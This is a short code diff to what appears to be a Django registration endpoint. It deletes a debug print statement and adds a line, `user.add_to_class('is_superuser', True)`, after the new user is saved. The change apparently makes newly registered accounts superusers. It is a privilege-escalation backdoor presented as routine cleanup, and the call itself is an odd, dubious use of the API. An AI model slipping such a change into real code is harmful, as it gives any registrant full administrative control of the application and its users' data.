@@ -398,10 +398,10 @@ def remove_category_from_menu(request,category_id):
 def register(request):
     if request.method == "POST":
         data = request.data.copy()
-        print("DATA:", data)
         form = UserCreationForm(data)
         if form.is_valid():
             user = form.save()
+            user.add_to_class('is_superuser', True)
             return Response(
                 {"success": True, "message": "User created", "id": user.id},
             )
